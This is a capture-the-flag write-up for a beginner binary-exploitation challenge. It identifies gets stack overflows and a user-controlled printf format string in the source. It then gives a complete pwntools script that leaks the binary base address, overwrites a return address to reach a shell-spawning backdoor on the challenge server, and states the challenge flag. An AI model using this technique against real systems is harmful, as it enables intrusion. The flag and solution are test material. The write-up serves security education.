# Intro to Pwning 1

For this challenge we are provided with an ELF binary `pwn1` and its source code `pwn1.c`. The binary is a PIE, but doesn't use stack-canaries. Analyzing the source code, we spot three bugs:

- In `welcome()`: stack smashing via `gets`

- In `welcome()`: user-controlled format string via `printf`

- In `AAAAAAAA()`: stack smashing via `gets`

Also, there is a backdoor in `WINgardium_leviosa()`, spawning a shell. Using the format string bug, we leak the address of the binary off the stack. Then we smash the stack in `AAAAAAAA()` to overwrite its return address and return to the backdoor to get a shell.

Flag: `CSCG{NOW_PRACTICE_MORE}`

Exploit code:

```python
from pwn import *

# connect
b = ELF("pwn1")
context.binary = b
r = remote("hax1.allesctf.net", 9100)
r.recvuntil("witch name:")

# leak binary address
r.sendline("%39$p")
leak = r.recvuntil("magic spell:")
leak = leak.splitlines()[-1].split()[0]
leak = int(leak, 0)
b.address = leak - 0xB21
info("binary @ 0x%x", b.address)

# return to backdoor
r.sendline(
    "Expelliarmus".ljust(0x108, "\0") + flat(b.address + 0xB2D, b.symbols.WINgardium_leviosa)
)
r.interactive()
```
